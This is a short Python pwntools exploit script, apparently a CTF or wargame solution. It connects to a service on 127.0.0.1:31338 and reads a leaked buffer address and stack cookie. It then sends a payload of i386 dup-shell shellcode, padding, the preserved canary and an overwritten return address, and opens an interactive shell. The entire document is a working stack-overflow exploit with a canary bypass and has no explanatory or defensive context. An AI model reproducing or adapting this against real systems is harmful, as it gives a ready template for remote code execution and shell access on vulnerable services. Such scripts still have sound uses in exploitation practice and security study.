from pwn import *

r = remote("127.0.0.1", 31338)
shellcode = asm(shellcraft.i386.linux.dupsh(4))

buf_addr = u32(r.recv(4))
cookie = u32(r.recv(4))
log.info("buf_addr : " + hex(buf_addr))
log.info("cookie : " + hex(cookie))

payload = shellcode
payload += 'A' * (0x800 - len(shellcode))
payload += p32(cookie)
payload += 'A' * 8
payload += 'B' * 4
payload += p32(buf_addr)
r.sendlineafter("here:\x00", payload)

r.interactive()
